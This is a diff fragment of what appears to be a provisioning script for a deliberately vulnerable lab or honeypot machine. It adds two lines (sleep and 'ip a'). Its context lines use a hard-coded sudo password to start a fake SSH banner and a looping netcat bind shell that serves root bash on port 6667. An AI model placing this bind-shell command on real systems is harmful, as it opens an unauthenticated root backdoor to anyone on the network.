@@ -284,7 +284,8 @@ echo "ubuntu" | sudo -S screen -d -m bash -c 'while true; do echo "SSH-2.0-OpenS
 
 echo "ubuntu" | sudo -S screen -d -m bash -c 'while true; do rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l -p 6667 > /tmp/f; sleep 1; done'
 
-
+    sleep 2
+    ip a && sleep 2
     EOT
   ]
 }
